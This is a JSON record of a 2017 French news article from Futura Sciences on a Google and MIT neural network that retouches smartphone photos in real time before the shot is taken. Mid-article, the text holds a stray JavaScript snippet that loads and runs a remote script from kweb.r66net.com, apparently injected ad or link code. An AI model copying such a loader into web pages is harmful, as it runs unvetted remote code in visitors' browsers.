{"title": "Google et le MIT créent une IA pour retoucher vos photos en temps réel", "newspaper": "Futura Sciences", "author": "Marc Zaffagni", "date_publi": "07/08/2017", "content": "Google a collaboré avec le MIT pour développer un algorithme d'apprentissage automatique si performant et économe en énergie qu'il peut retoucher une image prise avec un smartphone en temps réel. Ce qu'il faut retenir Google travaille depuis longtemps sur la photographie computationnelle. La collaboration avec le MIT a permis de créer un réseau neuronal convolutif capable de faire de la retouche photo en temps réel, en s’exécutant directement sur un smartphone. Le programme ne prend pas plus de mémoire de stockage qu'une photo numérique. Aujourd'hui, la plupart des  smartphones  et  applications  mobiles phares, comme Instagram, Snapchat ou Camera+, proposent des fonctions pour améliorer les photos avant de les publier sur la Toile. Ces opérations s'effectuent  a posteriori , sur la base du cliché initial enregistré par l'appareil photo. Mais peut-être que dans un avenir pas très lointain, les téléphones mobiles sauront améliorer les images avant même que nous ayons appuyé sur l'obturateur ! Google  et le  Massachusetts Institute of Technology  (MIT) ont développé une  intelligence artificielle  (IA) basée sur un  réseau neuronal  convolutif d'apprentissage automatique capable de retoucher automatiquement, et en temps réel, les images, à la manière d'un photographe professionnel avant que les clichés ne soient pris. Google a déjà beaucoup travaillé sur ce que l'on appelle « la  photographie  computationnelle », c'est-à-dire le fait de recourir à des algorithmes et des  logiciels  pour améliorer l'image plutôt que de rechercher la performance du côté du matériel. L'année dernière, le géant californien a lancé ses smartphones  Pixel  et Pixel XL, qui se sont rapidement imposés comme des références en  matière  de photographie sur mobiles grâce à un mode HDR ( high-dynamic-range  ou « grande gamme dynamique ») particulièrement efficace. Voici une image telle que la prendrait un smartphone sans intervention de l’IA de Google et du MIT. Le résultat avec intervention est à découvrir ci-dessous. © MIT et Google                               Google et le MIT ont trouvé deux  « astuces » Mais ces technologies ont un grand défaut : elles demandent une importante puissance de calcul, ce qui se traduit par une consommation d' énergie  plus importante. Deux facteurs qui ne font pas bon ménage avec les smartphones. C'est là qu'est intervenu le MIT avec le travail de Michael Gharbi, un étudiant chercheur qui avait développé une technique pour réduire la  bande passante  et la consommation d'énergie du traitement d'images entre un  smartphone  et un  serveur  en ligne. Cela consistait à envoyer une version basse résolution d'une image vers le serveur, lequel renvoyait une  « recette de transformation »  qui servait à retoucher la version haute résolution présente dans le mobile.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Google  et le MIT ont alors repris ces travaux avec l'objectif d'entraîner une IA à faire localement et plus vite ce que faisaient des serveurs. Les chercheurs se sont servis d'une  base de données  de 5.000 images, chacune retouchée par cinq photographes professionnels. Le nouveau  réseau neuronal convolutif  s'est appuyé sur ces informations pour apprendre quelles améliorations apporter à différentes images, comme, par exemple, diminuer la saturation, augmenter la  luminosité , corriger la balance des blancs, etc.  Mais comme ce travail s'effectue toujours sur une version basse résolution de l'image, afin de rester performant et peu énergivore, il fallait trouver le moyen de compenser la perte d'information au niveau de chaque pixel pour pouvoir ensuite retravailler la version haute résolution d'une photo sans l'altérer. Pour cela, les chercheurs de Google et du MIT ont eu recours à ce qu'ils appellent deux  « astuces » .  Le résultat une fois le processus de retouche en temps réel appliqué. © MIT et Google                               L'IA applique des formules mathématiques  Au lieu de produire une image complète, l'IA émet une série de  « formules simples »  pour modifier les  couleurs  des pixels d'une image. L'algorithme va évaluer la performance de ces formules en comparant l'image basse résolution retouchée, qui fait office d'étalon, à l'image haute résolution modifiée avec lesdites formules. Le système peut ainsi affiner de lui-même la qualité de la retouche.  La seconde « astuce » est une technique pour déterminer de quelle manière appliquer ces formules à chaque pixel de l'image haute résolution. Cela se fait grâce à l'application d'une grille tridimensionnelle dont chaque cellule contient les formules de modification des valeurs colorimétriques des pixels. Grâce à ces méthodes mathématiques combinées, l'IA s'est avérée capable de répliquer une image haute résolution HDR cent fois plus vite que l'algorithme d'origine.  Résultat : des images retouchées avec HDR peuvent s'afficher en temps réel sur l'écran du smartphone sous forme d'une prévisualisation avant que la photo ne soit enregistrée. Selon le MIT et Google, la taille du programme équivaut à celle d'une photo  numérique , ce qui veut dire qu'un smartphone pourrait intégrer plusieurs versions de l' IA  pour traiter les images selon différents  styles . À quand ces innovations dans les prochains Google Pixel ? ", "theme": "tech"}